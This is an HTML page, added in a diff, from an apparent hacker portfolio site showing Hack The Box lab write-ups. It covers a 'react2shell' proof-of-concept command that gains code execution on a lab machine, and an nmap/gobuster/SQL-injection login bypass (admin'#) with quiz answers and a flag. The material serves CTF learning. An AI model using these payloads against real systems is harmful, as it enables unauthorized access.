@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>0xRoot // Loading Manifest...</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <nav>
+    <div class="container nav-wrapper">
+      <a href="main.html" class="logo">0xROOT<span>//</span></a>
+      <div class="nav-links">
+        <a href="main.html">Home</a>
+        <a href="index.html" class="active">Target Writeups</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container" style="padding-top: 40px;">
+    <a href="index.html" style="color: var(--text-muted); text-decoration: none; font-family: var(--font-mono); font-size: 0.9rem; display: inline-block; margin-bottom: 30px;">&larr; Back to Operational Ledger</a>
+
+    <div id="target-reactor" class="machine-profile-node" style="display: none;">
+      <div class="page-header" style="padding-top:0;">
+        <div class="sys-badge" style="color: var(--neon-amber); border-color: rgba(245,158,11,0.2);">Linux // Hard</div>
+        <h2 style="font-size: 2.5rem; font-weight: 700; margin-top: 10px;">HTB: Reactor</h2>
+      </div>
+      
+      <div class="about-layout" style="margin-top:0;">
+        <div class="about-sidebar">
+          <div class="terminal-string">// TELEMETRY</div>
+          <p style="color: var(--text-muted); font-size:0.9rem; line-height:1.8; font-family: var(--font-mono);">
+            TIME: 1h 45m<br>TARGET: 10.129.10.200<br>PORT_EXP: 3000/TCP
+          </p>
+        </div>
+        <div class="timeline">
+          <div class="timeline-node">
+            <div class="timeline-title">Initial Foothold // React2Shell</div>
+            <p style="color: var(--text-muted); margin-bottom: 15px;">Exploiting prototype pollution patterns within modern React structures:</p>
+            <div class="panel-card console-box" style="background: var(--bg-void);">
+              <div class="console-line"># python3 react2shell-poc.py -t http://10.129.10.200:3000 -c "id"</div>
+              <div class="console-line" style="color: var(--neon-green);">uid=1001(node) gid=1001(node) groups=1001(node)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="target-appointment" class="machine-profile-node" style="display: none;">
+      <div class="page-header" style="padding-top:0;">
+        <div class="sys-badge">Linux // Very Easy</div>
+        <h2 style="font-size: 2.5rem; font-weight: 700; margin-top: 10px;">HTB: Appointment</h2>
+      </div>
+
+      <div class="about-layout" style="margin-top: 0;">
+        <div class="about-sidebar">
+          <div class="terminal-string">// CAPTURED_VECTORS</div>
+          <div class="tag" style="margin-bottom: 10px; display: inline-block;">SQL Injection</div>
+          <div class="tag" style="margin-bottom: 20px; display: inline-block;">Auth Bypass</div>
+          
+          <div class="terminal-string">// OPEN_PORTS</div>
+          <div style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted);">
+            <span style="color: var(--neon-cyan);">80/tcp</span> - Apache httpd 2.4.38
+          </div>
+        </div>
+
+        <div class="timeline">
+          <div class="timeline-node">
+            <div class="timeline-time">RECONNAISSANCE</div>
+            <div class="timeline-title">Nmap Target Port Verification</div>
+            <div class="panel-card console-box" style="background: var(--bg-void); margin-bottom: 15px;">
+              <div class="console-line"># nmap 10.129.17.133</div>
+              <div class="console-line">PORT   STATE SERVICE</div>
+              <div class="console-line"><span class="success">80/tcp open  http</span></div>
+            </div>
+          </div>
+
+          <div class="timeline-node">
+            <div class="timeline-time">ENUMERATION</div>
+            <div class="timeline-title">Gobuster Path Discovery Sequence</div>
+            <div class="panel-card console-box" style="background: var(--bg-void);">
+              <div class="console-line"># gobuster dir -u http://10.129.17.133:80 -w /usr/share/wordlists/...</div>
+              <div class="console-line">/images               (Status: 301) [Size: 315]</div>
+              <div class="console-line">/css                  (Status: 301) [Size: 312]</div>
+            </div>
+          </div>
+
+          <div class="timeline-node">
+            <div class="timeline-time">EXPLOITATION</div>
+            <div class="timeline-title">Comment-Based Authentication Bypass</div>
+            <p style="color: var(--text-muted); margin-bottom: 12px; font-size: 0.95rem;">
+              The active application login screen fails to sanitize database input fields. Intercepting authentication packets allows parameter pollution:
+            </p>
+            <div class="panel-card console-box" style="background: var(--bg-void);">
+              <div class="console-line"><span class="accent">Username:</span> admin'#</div>
+              <div class="console-line"><span class="accent">Password:</span> [ANY_DUMMY_VALUE]</div>
+              <div class="console-line" style="color: var(--neon-green); margin-top: 6px;">[✓] Verification bypassed. SQL query trailing logical evaluations commented out.</div>
+            </div>
+          </div>
+
+          <div class="timeline-node">
+            <div class="timeline-title" style="margin-bottom: 20px;">Component Interactive Tasks</div>
+            
+            <div class="panel-card" style="margin-bottom: 12px; background: rgba(255,255,255,0.01);">
+              <p style="font-size: 0.9rem; color: var(--text-main); margin-bottom: 8px;">1. What does the acronym SQL stand for?</p>
+              <button class="tab-btn" style="padding: 4px 12px; font-size: 0.75rem;" onclick="toggleTaskAnswer(this, 'Structured Query Language')">Show Answer</button>
+            </div>
+
+            <div class="panel-card" style="margin-bottom: 12px; background: rgba(255,255,255,0.01);">
+              <p style="font-size: 0.9rem; color: var(--text-main); margin-bottom: 8px;">2. What single character can be used to comment out the rest of a line in MySQL?</p>
+              <button class="tab-btn" style="padding: 4px 12px; font-size: 0.75rem;" onclick="toggleTaskAnswer(this, '#')">Show Answer</button>
+            </div>
+          </div>
+
+          <div class="timeline-node">
+            <div class="timeline-title">Root Operational Flag Vault</div>
+            <div class="panel-card" style="background: rgba(168, 85, 247, 0.03); display: flex; justify-content: space-between; align-items: center;">
+              <div style="font-family: var(--font-mono); font-size: 0.9rem;">
+                <span class="flag-blurred-mask" style="filter: blur(4px); opacity: 0.2; select: none;">e3d0796d002a446c0e622226f42e9672</span>
+              </div>
+              <button class="tab-btn active" style="padding: 6px 12px; font-size: 0.75rem;" onclick="revealTargetFlag(this, 'HTB{sql_1nj_4uth_byp4ss_cleared}')">Reveal Flag</button>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <div id="fallback-deck" style="display: none; text-align: center; padding: 80px 0;">
+      <h3 style="font-family: var(--font-mono); color: var(--neon-purple);">[!] EXCEPTION: RECORD_NOT_FOUND</h3>
+      <p style="color: var(--text-muted); margin-top: 10px;">The targeted operation payload key is unrecognized by this platform instance architecture.</p>
+    </div>
+
+  </div>
+
+  <script src="main.js"></script>
+</body>
+</html>
